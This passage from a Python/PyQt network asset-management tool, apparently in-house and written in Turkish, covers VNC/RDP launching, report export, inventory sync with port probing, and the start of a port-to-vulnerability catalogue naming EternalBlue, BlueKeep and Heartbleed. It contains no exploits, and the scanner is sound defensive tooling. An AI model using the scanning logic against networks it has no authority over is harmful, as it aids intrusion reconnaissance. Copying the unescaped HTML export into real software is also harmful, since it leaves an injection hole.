        if info['sound']:
            for s in info['sound']:
                hw += f"\n   └─ {s['name']}"
        else:
            hw += "\n   Bilgi alınamadı"
        
        self.hw_text.setText(hw)
        
        # Disk Tab
        disk = """
╔══════════════════════════════════════════════════════════════════╗
║                         DİSK BİLGİLERİ                           ║
╚══════════════════════════════════════════════════════════════════╝
"""
        if info['disks']:
            for d in info['disks']:
                disk += f"""
💾  {d['model']}
   ├─ Boyut: {d['size']}
   ├─ Tip: {d['type']}
   ├─ Arayüz: {d['interface']}
   └─ Seri: {d['serial'] if d['serial'] else '-'}
"""
        else:
            disk += "\n   Bilgi alınamadı"
        
        self.disk_text.setText(disk)
        
        # Ağ Tab
        net = """
╔══════════════════════════════════════════════════════════════════╗
║                          AĞ BİLGİLERİ                            ║
╚══════════════════════════════════════════════════════════════════╝
"""
        if info['network']:
            for n in info['network']:
                net += f"""
🌐  {n['name']}
   ├─ MAC: {n['mac']}
   ├─ IP: {n['ip']}
   ├─ Gateway: {n['gateway']}
   └─ DNS: {n['dns']}
"""
        else:
            net += "\n   Bilgi alınamadı"
        
        self.net_text.setText(net)
        
        # VNC/RDP butonlarını etkinleştir
        self.vnc_btn.setEnabled(True)
        self.rdp_btn.setEnabled(True)
        self.add_selected_btn.setEnabled(True)
        self.selected_ip = ip
        self.selected_hostname = info['computer'].get('name', '')
    
    def show_pc_context_menu(self, pos):
        """PC listesinde sağ tık menüsü"""
        item = self.pc_list.itemAt(pos)
        if not item:
            return
        
        ip = item.data(Qt.ItemDataRole.UserRole)
        if not ip:
            return
        
        menu = QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#16213e;color:white;border:1px solid #0f3460;border-radius:6px;}
            QMenu::item{padding:8px 20px;}
            QMenu::item:selected{background:#00d4ff;color:#1a1a2e;}
            QMenu::separator{background:#0f3460;height:1px;margin:5px 10px;}
        """)
        
        vnc_action = menu.addAction("🖥️ VNC ile Bağlan")
        rdp_action = menu.addAction("🖥️ RDP ile Bağlan")
        menu.addSeparator()
        ping_action = menu.addAction("🏓 Ping At")
        browse_action = menu.addAction("🌐 Web Arayüzü Aç")
        menu.addSeparator()
        copy_ip = menu.addAction("📋 IP Kopyala")
        copy_name = menu.addAction("📋 PC Adı Kopyala")
        
        action = menu.exec(self.pc_list.mapToGlobal(pos))
        
        if action == vnc_action:
            self.vnc_connect()
        elif action == rdp_action:
            self.rdp_connect()
        elif action == ping_action:
            self.ping_host(ip)
        elif action == browse_action:
            import webbrowser
            webbrowser.open(f"http://{ip}")
        elif action == copy_ip:
            QApplication.clipboard().setText(ip)
        elif action == copy_name:
            info = next((r for r in self.results if r['ip'] == ip), None)
            if info:
                QApplication.clipboard().setText(info['computer'].get('name', ip))
    
    def vnc_connect(self, item=None):
        """VNC ile bağlan"""
        if not hasattr(self, 'selected_ip') or not self.selected_ip:
            selected = self.pc_list.currentItem()
            if not selected:
                QMessageBox.warning(self, "Uyarı", "Önce bir bilgisayar seçin!")
                return
            self.selected_ip = selected.data(Qt.ItemDataRole.UserRole)
            info = next((r for r in self.results if r['ip'] == self.selected_ip), None)
            self.selected_hostname = info['computer'].get('name', '') if info else ''
        
        # Hostname veya IP kullan
        target = self.selected_hostname.lower() if self.selected_hostname else self.selected_ip
        
        # Seçim dialogu
        dialog = QDialog(self)
        dialog.setWindowTitle("VNC Bağlantısı")
        dialog.setFixedWidth(350)
        dialog.setStyleSheet("QDialog{background:#1a1a2e;}")
        layout = QVBoxLayout(dialog)
        
        # Hedef seçimi
        target_group = QGroupBox("Bağlantı Hedefi")
        target_group.setStyleSheet("QGroupBox{color:white;border:1px solid #0f3460;border-radius:6px;padding:10px;margin-top:10px;}"
                                  "QGroupBox::title{subcontrol-origin:margin;left:10px;}")
        target_layout = QVBoxLayout(target_group)
        
        ip_radio = QRadioButton(f"IP Adresi: {self.selected_ip}")
        ip_radio.setStyleSheet("QRadioButton{color:white;}")
        ip_radio.setChecked(True)
        target_layout.addWidget(ip_radio)
        
        if self.selected_hostname:
            host_radio = QRadioButton(f"Hostname: {self.selected_hostname.lower()}")
            host_radio.setStyleSheet("QRadioButton{color:white;}")
            target_layout.addWidget(host_radio)
        else:
            host_radio = None
        
        layout.addWidget(target_group)
        
        # VNC Port
        port_layout = QHBoxLayout()
        port_label = QLabel("VNC Port:")
        port_label.setStyleSheet("color:white;")
        port_input = QLineEdit("5900")
        port_input.setFixedWidth(80)
        port_input.setStyleSheet("QLineEdit{background:#0a0a14;color:white;border:1px solid #0f3460;border-radius:4px;padding:5px;}")
        port_layout.addWidget(port_label)
        port_layout.addWidget(port_input)
        port_layout.addStretch()
        layout.addLayout(port_layout)
        
        # VNC Viewer seçimi
        viewer_group = QGroupBox("VNC Viewer")
        viewer_group.setStyleSheet("QGroupBox{color:white;border:1px solid #0f3460;border-radius:6px;padding:10px;margin-top:10px;}"
                                   "QGroupBox::title{subcontrol-origin:margin;left:10px;}")
        viewer_layout = QVBoxLayout(viewer_group)
        
        tight_radio = QRadioButton("TightVNC Viewer")
        tight_radio.setStyleSheet("QRadioButton{color:white;}")
        tight_radio.setChecked(True)
        viewer_layout.addWidget(tight_radio)
        
        real_radio = QRadioButton("RealVNC Viewer")
        real_radio.setStyleSheet("QRadioButton{color:white;}")
        viewer_layout.addWidget(real_radio)
        
        tiger_radio = QRadioButton("TigerVNC Viewer")
        tiger_radio.setStyleSheet("QRadioButton{color:white;}")
        viewer_layout.addWidget(tiger_radio)
        
        layout.addWidget(viewer_group)
        
        # Butonlar
        btn_layout = QHBoxLayout()
        connect_btn = QPushButton("🖥️ Bağlan")
        connect_btn.setStyleSheet("QPushButton{background:#27ae60;color:white;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;}"
                                 "QPushButton:hover{background:#2ecc71;}")
        cancel_btn = QPushButton("İptal")
        cancel_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;padding:10px 20px;border:none;border-radius:6px;}"
                                "QPushButton:hover{background:#c0392b;}")
        btn_layout.addWidget(connect_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)
        
        connect_btn.clicked.connect(dialog.accept)
        cancel_btn.clicked.connect(dialog.reject)
        
        if dialog.exec() == QDialog.DialogCode.Accepted:
            # Hedef belirleme
            if host_radio and host_radio.isChecked():
                vnc_target = self.selected_hostname.lower()
            else:
                vnc_target = self.selected_ip
            
            port = port_input.text().strip() or "5900"
            
            # VNC viewer çalıştır
            vnc_paths = []
            
            if tight_radio.isChecked():
                vnc_paths = [
                    r"C:\Program Files\TightVNC\tvnviewer.exe",
                    r"C:\Program Files (x86)\TightVNC\tvnviewer.exe",
                    "tvnviewer.exe"
                ]
            elif real_radio.isChecked():
                vnc_paths = [
                    r"C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe",
                    r"C:\Program Files (x86)\RealVNC\VNC Viewer\vncviewer.exe",
                    "vncviewer.exe"
                ]
            elif tiger_radio.isChecked():
                vnc_paths = [
                    r"C:\Program Files\TigerVNC\vncviewer.exe",
                    r"C:\Program Files (x86)\TigerVNC\vncviewer.exe",
                    "vncviewer.exe"
                ]
            
            # VNC viewer bul ve çalıştır
            vnc_exe = None
            for path in vnc_paths:
                if os.path.exists(path):
                    vnc_exe = path
                    break
                # PATH'te ara
                try:
                    result = subprocess.run(['where', path], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        vnc_exe = result.stdout.strip().split('\n')[0]
                        break
                except:
                    pass
            
            if vnc_exe:
                try:
                    # VNC bağlantısı - hostname veya IP::port formatı
                    if port != "5900":
                        vnc_address = f"{vnc_target}::{port}"
                    else:
                        vnc_address = vnc_target
                    
                    subprocess.Popen([vnc_exe, vnc_address], 
                                   creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
                    self.status_label.setText(f"🖥️ VNC: {vnc_target} bağlanıyor...")
                except Exception as e:
                    QMessageBox.critical(self, "Hata", f"VNC başlatılamadı:\n{str(e)}")
            else:
                QMessageBox.warning(self, "VNC Viewer Bulunamadı", 
                    "VNC Viewer bulunamadı!\n\n"
                    "Lütfen aşağıdakilerden birini kurun:\n"
                    "• TightVNC: https://www.tightvnc.com/\n"
                    "• RealVNC: https://www.realvnc.com/\n"
                    "• TigerVNC: https://tigervnc.org/")
    
    def rdp_connect(self):
        """RDP ile bağlan"""
        if not hasattr(self, 'selected_ip') or not self.selected_ip:
            selected = self.pc_list.currentItem()
            if not selected:
                QMessageBox.warning(self, "Uyarı", "Önce bir bilgisayar seçin!")
                return
            self.selected_ip = selected.data(Qt.ItemDataRole.UserRole)
            info = next((r for r in self.results if r['ip'] == self.selected_ip), None)
            self.selected_hostname = info['computer'].get('name', '') if info else ''
        
        # Hedef seçim dialogu
        dialog = QDialog(self)
        dialog.setWindowTitle("RDP Bağlantısı")
        dialog.setFixedWidth(350)
        dialog.setStyleSheet("QDialog{background:#1a1a2e;}")
        layout = QVBoxLayout(dialog)
        
        # Hedef seçimi
        target_group = QGroupBox("Bağlantı Hedefi")
        target_group.setStyleSheet("QGroupBox{color:white;border:1px solid #0f3460;border-radius:6px;padding:10px;margin-top:10px;}"
                                  "QGroupBox::title{subcontrol-origin:margin;left:10px;}")
        target_layout = QVBoxLayout(target_group)
        
        ip_radio = QRadioButton(f"IP Adresi: {self.selected_ip}")
        ip_radio.setStyleSheet("QRadioButton{color:white;}")
        ip_radio.setChecked(True)
        target_layout.addWidget(ip_radio)
        
        if self.selected_hostname:
            host_radio = QRadioButton(f"Hostname: {self.selected_hostname}")
            host_radio.setStyleSheet("QRadioButton{color:white;}")
            target_layout.addWidget(host_radio)
        else:
            host_radio = None
        
        layout.addWidget(target_group)
        
        # Tam ekran seçeneği
        fullscreen_check = QCheckBox("Tam Ekran")
        fullscreen_check.setStyleSheet("QCheckBox{color:white;}")
        fullscreen_check.setChecked(True)
        layout.addWidget(fullscreen_check)
        
        # Butonlar
        btn_layout = QHBoxLayout()
        connect_btn = QPushButton("🖥️ Bağlan")
        connect_btn.setStyleSheet("QPushButton{background:#3498db;color:white;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;}"
                                 "QPushButton:hover{background:#2980b9;}")
        cancel_btn = QPushButton("İptal")
        cancel_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;padding:10px 20px;border:none;border-radius:6px;}"
                                "QPushButton:hover{background:#c0392b;}")
        btn_layout.addWidget(connect_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)
        
        connect_btn.clicked.connect(dialog.accept)
        cancel_btn.clicked.connect(dialog.reject)
        
        if dialog.exec() == QDialog.DialogCode.Accepted:
            # Hedef belirleme
            if host_radio and host_radio.isChecked():
                rdp_target = self.selected_hostname
            else:
                rdp_target = self.selected_ip
            
            try:
                # mstsc.exe ile RDP bağlantısı
                cmd = ['mstsc', f'/v:{rdp_target}']
                if fullscreen_check.isChecked():
                    cmd.append('/f')
                
                subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
                self.status_label.setText(f"🖥️ RDP: {rdp_target} bağlanıyor...")
            except Exception as e:
                QMessageBox.critical(self, "Hata", f"RDP başlatılamadı:\n{str(e)}")
    
    def ping_host(self, ip):
        """Hızlı ping testi"""
        try:
            result = subprocess.run(['ping', '-n', '4', ip], capture_output=True, text=True, timeout=10,
                                   creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            
            dialog = QDialog(self)
            dialog.setWindowTitle(f"Ping: {ip}")
            dialog.setMinimumSize(500, 300)
            dialog.setStyleSheet("QDialog{background:#1a1a2e;}")
            layout = QVBoxLayout(dialog)
            
            text = QTextEdit()
            text.setReadOnly(True)
            text.setStyleSheet("QTextEdit{background:#0a0a14;color:#00ff88;border:none;font-family:Consolas;}")
            text.setText(result.stdout)
            layout.addWidget(text)
            
            close_btn = QPushButton("Kapat")
            close_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;padding:8px 20px;border:none;border-radius:4px;}")
            close_btn.clicked.connect(dialog.close)
            layout.addWidget(close_btn)
            
            dialog.exec()
        except Exception as e:
            QMessageBox.critical(self, "Hata", f"Ping hatası:\n{str(e)}")
    
    def clear_results(self):
        """Sonuçları temizle"""
        self.results = []
        self.pc_list.clear()
        self.general_text.clear()
        self.hw_text.clear()
        self.disk_text.clear()
        self.net_text.clear()
        self.progress.setValue(0)
        self.stats_label.setText("📊 0 bilgisayar tarandı")
        self.result_count_label.setText("📊 0 cihaz bulundu")
        self.add_to_assets_btn.setEnabled(False)
        self.add_selected_btn.setEnabled(False)
        self.vnc_btn.setEnabled(False)
        self.rdp_btn.setEnabled(False)
    
    def export_excel(self):
        """Excel export"""
        if not self.results:
            QMessageBox.warning(self, "Uyarı", "Önce tarama yapın!")
            return
        
        path, _ = QFileDialog.getSaveFileName(self, "Excel Kaydet", "sistem_bilgileri.csv", "CSV (*.csv)")
        if not path:
            return
        
        with open(path, 'w', encoding='utf-8-sig') as f:
            f.write("IP,PC Adı,Üretici,Model,İşletim Sistemi,CPU,RAM (GB),GPU,Disk\n")
            for r in self.results:
                ip = r['ip']
                name = r['computer'].get('name', '')
                mfr = r['computer'].get('manufacturer', '')
                model = r['computer'].get('model', '')
                os_name = r['os'].get('name', '')
                cpu = r['cpu'].get('name', '').replace(',', ' ')
                ram = r['computer'].get('total_ram', 0)
                gpu = r['gpu'][0]['name'].replace(',', ' ') if r['gpu'] else ''
                disk = r['disks'][0]['size'] if r['disks'] else ''
                f.write(f"{ip},{name},{mfr},{model},{os_name},{cpu},{ram},{gpu},{disk}\n")
        
        QMessageBox.information(self, "Başarılı", f"Export tamamlandı:\n{path}")
    
    def export_html(self):
        """HTML rapor export"""
        if not self.results:
            QMessageBox.warning(self, "Uyarı", "Önce tarama yapın!")
            return
        
        path, _ = QFileDialog.getSaveFileName(self, "HTML Kaydet", "sistem_raporu.html", "HTML (*.html)")
        if not path:
            return
        
        html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>MotunNet Sistem Raporu</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: white; padding: 20px; }
        h1 { color: #00d4ff; border-bottom: 2px solid #00d4ff; padding-bottom: 10px; }
        h2 { color: #00ff88; margin-top: 30px; }
        .pc-card { background: #16213e; padding: 20px; margin: 20px 0; border-radius: 10px; border-left: 4px solid #00d4ff; }
        .section { margin: 15px 0; }
        .section-title { color: #f39c12; font-weight: bold; margin-bottom: 5px; }
        table { border-collapse: collapse; width: 100%; margin: 10px 0; }
        th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; }
        th { background: #0f3460; color: #00ff88; }
        .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .info-item { background: #0a0a14; padding: 10px; border-radius: 5px; }
        .info-label { color: #888; font-size: 12px; }
        .info-value { color: #00d4ff; font-size: 14px; }
        .ssd { color: #00ff88; }
        .hdd { color: #f39c12; }
        .nvme { color: #00d4ff; font-weight: bold; }
    </style>
</head>
<body>
    <h1>MotunNet Sistem Bilgisi Raporu</h1>
    <p>Tarih: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + f"""</p>
    <p>Toplam: {len(self.results)} bilgisayar</p>
"""
        
        for r in self.results:
            html += f"""
    <div class="pc-card">
        <h2>{r['computer'].get('name', r['ip'])}</h2>
        
        <div class="info-grid">
            <div class="info-item">
                <div class="info-label">IP Adresi</div>
                <div class="info-value">{r['ip']}</div>
            </div>
            <div class="info-item">
                <div class="info-label">Isletim Sistemi</div>
                <div class="info-value">{r['os'].get('name', '-')}</div>
            </div>
            <div class="info-item">
                <div class="info-label">Islemci</div>
                <div class="info-value">{r['cpu'].get('name', '-')}</div>
            </div>
            <div class="info-item">
                <div class="info-label">RAM</div>
                <div class="info-value">{r['computer'].get('total_ram', 0)} GB</div>
            </div>
        </div>
        
        <div class="section">
            <div class="section-title">Ekran Karti</div>
"""
            for g in r['gpu']:
                html += f"            <p>{g['name']} - {g['vram']}</p>\n"
            
            html += """        </div>
        
        <div class="section">
            <div class="section-title">Diskler</div>
            <table>
                <tr><th>Model</th><th>Boyut</th><th>Tip</th><th>Seri No</th></tr>
"""
            for d in r['disks']:
                disk_type = d.get('type', '')
                # Tip için CSS sınıfı
                css_class = ''
                if 'NVMe' in disk_type:
                    css_class = 'nvme'
                elif 'SSD' in disk_type:
                    css_class = 'ssd'
                elif 'HDD' in disk_type:
                    css_class = 'hdd'
                
                serial = d.get('serial', '')[:20] if d.get('serial') else '-'
                html += f'                <tr><td>{d["model"]}</td><td>{d["size"]}</td><td class="{css_class}">{disk_type}</td><td>{serial}</td></tr>\n'
            
            html += """            </table>
        </div>
    </div>
"""
        
        html += """
</body>
</html>"""
        
        # UTF-8 BOM ile yaz (Windows uyumluluğu için)
        with open(path, 'w', encoding='utf-8-sig') as f:
            f.write(html)
        
        QMessageBox.information(self, "Basarili", f"Rapor kaydedildi:\n{path}")
    
    def sync_to_assets(self):
        """Sistem bilgilerini varlıklara aktar"""
        if not self.results:
            QMessageBox.warning(self, "Uyarı", "Önce tarama yapın!")
            return
        
        if not self.org:
            QMessageBox.warning(self, "Uyarı", "Varlık yöneticisi bağlantısı yok!")
            return
        
        matched = 0
        created = 0
        updated = 0
        not_matched = []
        
        for r in self.results:
            ip = r.get('ip', '')
            hostname = r.get('computer', {}).get('name', '')
            
            # Network bilgisinden MAC al
            mac_address = ''
            if r.get('network'):
                for net in r['network']:
                    if net.get('mac'):
                        mac_address = net['mac']
                        break
            
            # MAC'den vendor bul
            vendor = ''
            if mac_address:
                vendor, _ = get_mac_vendor(mac_address)
            
            # Açık portları tara
            open_ports_list = []
            common_ports = [80, 443, 445, 139, 3389, 5900, 22, 135, 554]
            for port in common_ports:
                if scan_port(ip, port, timeout=0.3):
                    port_name = COMMON_PORTS.get(port, '')
                    open_ports_list.append(f"{port}({port_name})" if port_name else str(port))
            open_ports_str = ", ".join(open_ports_list)
            
            # IP veya hostname ile varlık ara
            found_asset = None
            for asset in self.org.get_assets():
                # IP eşleşmesi
                if asset.ip_address and asset.ip_address == ip:
                    found_asset = asset
                    break
                # Hostname eşleşmesi
                if asset.hostname and hostname:
                    if asset.hostname.lower() == hostname.lower():
                        found_asset = asset
                        break
                # Varlık adı eşleşmesi
                if asset.name and hostname:
                    if asset.name.lower() == hostname.lower():
                        found_asset = asset
                        break
                # MAC eşleşmesi
                if asset.mac_address and mac_address:
                    if asset.mac_address.upper().replace('-', ':') == mac_address.upper().replace('-', ':'):
                        found_asset = asset
                        break
            
            if found_asset:
                matched += 1
                # Donanım bilgilerini güncelle
                found_asset.os_name = r.get('os', {}).get('name', '')
                found_asset.os_version = r.get('os', {}).get('version', '')
                found_asset.os_build = r.get('os', {}).get('build', '')
                found_asset.cpu_name = r.get('cpu', {}).get('name', '')
                found_asset.cpu_cores = r.get('cpu', {}).get('cores', '')
                found_asset.cpu_threads = r.get('cpu', {}).get('threads', '')
                found_asset.ram_total = r.get('ram', {}).get('total', '') or f"{r.get('computer', {}).get('total_ram', 0)} GB"
                found_asset.pc_manufacturer = r.get('computer', {}).get('manufacturer', '')
                found_asset.pc_model = r.get('computer', {}).get('model', '')
                found_asset.bios_serial = r.get('bios', {}).get('serial', '')
                
                # Vendor ve Açık Portlar güncelle
                if vendor:
                    found_asset.vendor = vendor
                if open_ports_str:
                    found_asset.open_ports = open_ports_str
                
                # MAC adresi güncelle
                if mac_address and not found_asset.mac_address:
                    found_asset.mac_address = mac_address
                
                # GPU bilgisi
                if r.get('gpu'):
                    found_asset.gpu_name = r['gpu'][0].get('name', '')
                    found_asset.gpu_vram = r['gpu'][0].get('vram', '')
                
                # Disk bilgisi (sadece fiziksel diskler, partition hariç)
                physical_disks = [d for d in r.get('disks', []) if d.get('type') != 'Partition']
                if physical_disks:
                    # Yeni format - disks listesi
                    found_asset.disks = physical_disks
                    # Eski format - uyumluluk için
                    disk_summary = "; ".join([f"{d.get('model', '')} ({d.get('size', '')}) [{d.get('type', '')}]" for d in physical_disks])
                    found_asset.disk_info = disk_summary
                
                # Hostname ve IP güncelle
                if not found_asset.hostname and hostname:
                    found_asset.hostname = hostname
                if not found_asset.ip_address and ip:
                    found_asset.ip_address = ip
                
                # Son tarama tarihi
                found_asset.last_hw_scan = datetime.now().strftime("%Y-%m-%d %H:%M")
                
                updated += 1
            else:
                not_matched.append({'ip': ip, 'hostname': hostname, 'mac': mac_address, 'vendor': vendor, 'open_ports': open_ports_str, 'data': r})
        
        # Kaydet
        self.org.save()
        
        # Sonuç mesajı
        msg = f"✅ Senkronizasyon tamamlandı!\n\n"
        msg += f"📊 Taranan: {len(self.results)} bilgisayar\n"
        msg += f"🔗 Eşleşen: {matched} varlık\n"
        msg += f"📝 Güncellenen: {updated} varlık\n"
        
        if not_matched:
            msg += f"\n⚠️ Eşleşmeyen: {len(not_matched)} bilgisayar\n"
            msg += "\nEşleşmeyenler için yeni varlık oluşturmak ister misiniz?"
            
            reply = QMessageBox.question(self, "Varlıklara Aktar", msg,
                                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            
            if reply == QMessageBox.StandardButton.Yes:
                # Eşleşmeyenler için yeni varlık oluştur
                created = self.create_assets_from_results(not_matched)
                QMessageBox.information(self, "Tamamlandı", 
                    f"✅ {created} yeni varlık oluşturuldu!")
        else:
            QMessageBox.information(self, "Varlıklara Aktar", msg)
    
    def create_assets_from_results(self, not_matched):
        """Eşleşmeyen sonuçlar için yeni varlık oluştur"""
        created = 0
        
        # Varsayılan departman (ilk departman veya yeni oluştur)
        departments = self.org.get_departments()
        if departments:
            default_dept_id = departments[0].id
        else:
            # "Tarama" adında departman oluştur
            new_dept = Department(id=str(uuid.uuid4()), name="Tarama Sonuçları")
            self.org.add_department(new_dept)
            default_dept_id = new_dept.id
        
        for item in not_matched:
            r = item['data']
            hostname = item['hostname']
            ip = item['ip']
            mac_address = item.get('mac', '')
            vendor = item.get('vendor', '')
            open_ports = item.get('open_ports', '')
            
            # Yeni varlık oluştur
            new_asset = Asset(
                id=str(uuid.uuid4()),
                name=hostname or f"PC-{ip}",
                asset_type="desktop",
                department_id=default_dept_id,
                hostname=hostname,
                ip_address=ip,
                mac_address=mac_address,
                vendor=vendor,
                open_ports=open_ports,
                # Donanım bilgileri
                os_name=r.get('os', {}).get('name', ''),
                os_version=r.get('os', {}).get('version', ''),
                os_build=r.get('os', {}).get('build', ''),
                cpu_name=r.get('cpu', {}).get('name', ''),
                cpu_cores=r.get('cpu', {}).get('cores', ''),
                cpu_threads=r.get('cpu', {}).get('threads', ''),
                ram_total=r.get('ram', {}).get('total', '') or f"{r.get('computer', {}).get('total_ram', 0)} GB",
                pc_manufacturer=r.get('computer', {}).get('manufacturer', ''),
                pc_model=r.get('computer', {}).get('model', ''),
                bios_serial=r.get('bios', {}).get('serial', ''),
                last_hw_scan=datetime.now().strftime("%Y-%m-%d %H:%M")
            )
            
            # GPU
            if r.get('gpu'):
                new_asset.gpu_name = r['gpu'][0].get('name', '')
                new_asset.gpu_vram = r['gpu'][0].get('vram', '')
            
            # Disk
            physical_disks = [d for d in r.get('disks', []) if d.get('type') != 'Partition']
            if physical_disks:
                new_asset.disks = physical_disks
                new_asset.disk_info = "; ".join([f"{d.get('model', '')} ({d.get('size', '')}) [{d.get('type', '')}]" for d in physical_disks])
            
            self.org.add_asset(new_asset)
            created += 1
        
        self.org.save()
        return created


# ============= VULNERABILITY SCANNER =============

# Zafiyet Veritabanı
VULN_DATABASE = {
    # Port: {risk, service, vulns: [{name, severity, description, cve}]}
    21: {
        'service': 'FTP',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'Anonymous FTP', 'severity': 'HIGH', 'desc': 'Anonim FTP erişimi açık olabilir', 'check': 'anonymous'},
            {'name': 'Cleartext Protocol', 'severity': 'MEDIUM', 'desc': 'Şifreler açık metin olarak iletilir', 'cve': 'N/A'},
            {'name': 'FTP Bounce Attack', 'severity': 'MEDIUM', 'desc': 'FTP bounce saldırısına açık', 'cve': 'CVE-1999-0017'},
        ]
    },
    22: {
        'service': 'SSH',
        'risk': 'LOW',
        'vulns': [
            {'name': 'SSH Weak Ciphers', 'severity': 'LOW', 'desc': 'Zayıf şifreleme algoritmaları', 'check': 'cipher'},
            {'name': 'SSH Root Login', 'severity': 'MEDIUM', 'desc': 'Root ile SSH girişi açık olabilir', 'check': 'root'},
        ]
    },
    23: {
        'service': 'Telnet',
        'risk': 'CRITICAL',
        'vulns': [
            {'name': 'Telnet Cleartext', 'severity': 'CRITICAL', 'desc': 'Tüm veriler şifresiz iletilir!', 'cve': 'N/A'},
            {'name': 'No Encryption', 'severity': 'CRITICAL', 'desc': 'Şifreleme yok, MITM saldırısına açık', 'cve': 'N/A'},
        ]
    },
    25: {
        'service': 'SMTP',
        'risk': 'MEDIUM',
        'vulns': [
            {'name': 'Open Relay', 'severity': 'HIGH', 'desc': 'Açık mail relay olabilir', 'check': 'relay'},
            {'name': 'SMTP User Enum', 'severity': 'MEDIUM', 'desc': 'VRFY/EXPN ile kullanıcı tespiti', 'cve': 'N/A'},
        ]
    },
    53: {
        'service': 'DNS',
        'risk': 'MEDIUM',
        'vulns': [
            {'name': 'DNS Zone Transfer', 'severity': 'HIGH', 'desc': 'Zone transfer açık olabilir', 'check': 'axfr'},
            {'name': 'DNS Cache Poisoning', 'severity': 'MEDIUM', 'desc': 'Cache poisoning riski', 'cve': 'CVE-2008-1447'},
        ]
    },
    80: {
        'service': 'HTTP',
        'risk': 'MEDIUM',
        'vulns': [
            {'name': 'Unencrypted HTTP', 'severity': 'MEDIUM', 'desc': 'HTTPS kullanılmıyor', 'cve': 'N/A'},
            {'name': 'Directory Listing', 'severity': 'LOW', 'desc': 'Dizin listeleme açık olabilir', 'check': 'dirlist'},
            {'name': 'Default Pages', 'severity': 'LOW', 'desc': 'Varsayılan web sayfaları', 'check': 'default'},
        ]
    },
    110: {
        'service': 'POP3',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'POP3 Cleartext', 'severity': 'HIGH', 'desc': 'Şifreler açık metin', 'cve': 'N/A'},
        ]
    },
    135: {
        'service': 'MS-RPC',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'RPC Vulnerabilities', 'severity': 'HIGH', 'desc': 'Çoklu RPC zafiyetleri', 'cve': 'MS03-026'},
            {'name': 'DCOM Exploit', 'severity': 'CRITICAL', 'desc': 'Uzaktan kod çalıştırma', 'cve': 'CVE-2003-0352'},
        ]
    },
    139: {
        'service': 'NetBIOS',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'NetBIOS Info Leak', 'severity': 'MEDIUM', 'desc': 'Sistem bilgisi sızıntısı', 'cve': 'N/A'},
            {'name': 'Null Session', 'severity': 'HIGH', 'desc': 'Null session ile bilgi toplama', 'cve': 'N/A'},
        ]
    },
    143: {
        'service': 'IMAP',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'IMAP Cleartext', 'severity': 'HIGH', 'desc': 'Şifreler açık metin', 'cve': 'N/A'},
        ]
    },
    443: {
        'service': 'HTTPS',
        'risk': 'LOW',
        'vulns': [
            {'name': 'SSL/TLS Weak', 'severity': 'MEDIUM', 'desc': 'Zayıf SSL/TLS versiyonu', 'check': 'ssl'},
            {'name': 'Heartbleed', 'severity': 'CRITICAL', 'desc': 'OpenSSL Heartbleed', 'cve': 'CVE-2014-0160', 'check': 'heartbleed'},
        ]
    },
    445: {
        'service': 'SMB',
        'risk': 'CRITICAL',
        'vulns': [
            {'name': 'EternalBlue', 'severity': 'CRITICAL', 'desc': 'MS17-010 SMBv1 RCE', 'cve': 'CVE-2017-0144'},
            {'name': 'SMBv1 Enabled', 'severity': 'HIGH', 'desc': 'Eski SMBv1 protokolü aktif', 'cve': 'N/A'},
            {'name': 'SMB Signing', 'severity': 'MEDIUM', 'desc': 'SMB imzalama kapalı', 'check': 'signing'},
        ]
    },
    1433: {
        'service': 'MSSQL',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'SQL Injection', 'severity': 'CRITICAL', 'desc': 'SQL enjeksiyon riski', 'cve': 'N/A'},
            {'name': 'SA Default Password', 'severity': 'CRITICAL', 'desc': 'Varsayılan SA şifresi', 'check': 'sa'},
            {'name': 'xp_cmdshell', 'severity': 'HIGH', 'desc': 'xp_cmdshell aktif olabilir', 'cve': 'N/A'},
        ]
    },
    1521: {
        'service': 'Oracle',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'TNS Listener', 'severity': 'HIGH', 'desc': 'TNS Listener zafiyetleri', 'cve': 'CVE-2012-1675'},
        ]
    },
    3306: {
        'service': 'MySQL',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'MySQL Root No Pass', 'severity': 'CRITICAL', 'desc': 'Root şifresiz olabilir', 'check': 'root'},
            {'name': 'Remote Root Login', 'severity': 'HIGH', 'desc': 'Uzaktan root girişi', 'cve': 'N/A'},
        ]
    },
    3389: {
        'service': 'RDP',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'BlueKeep', 'severity': 'CRITICAL', 'desc': 'CVE-2019-0708 RCE', 'cve': 'CVE-2019-0708'},
            {'name': 'RDP NLA Disabled', 'severity': 'MEDIUM', 'desc': 'NLA devre dışı', 'check': 'nla'},
            {'name': 'Brute Force Risk', 'severity': 'MEDIUM', 'desc': 'Kaba kuvvet saldırısı riski', 'cve': 'N/A'},
        ]
    },
    5432: {
        'service': 'PostgreSQL',
        'risk': 'MEDIUM',
        'vulns': [
            {'name': 'Trust Authentication', 'severity': 'HIGH', 'desc': 'Trust auth aktif olabilir', 'check': 'trust'},
        ]
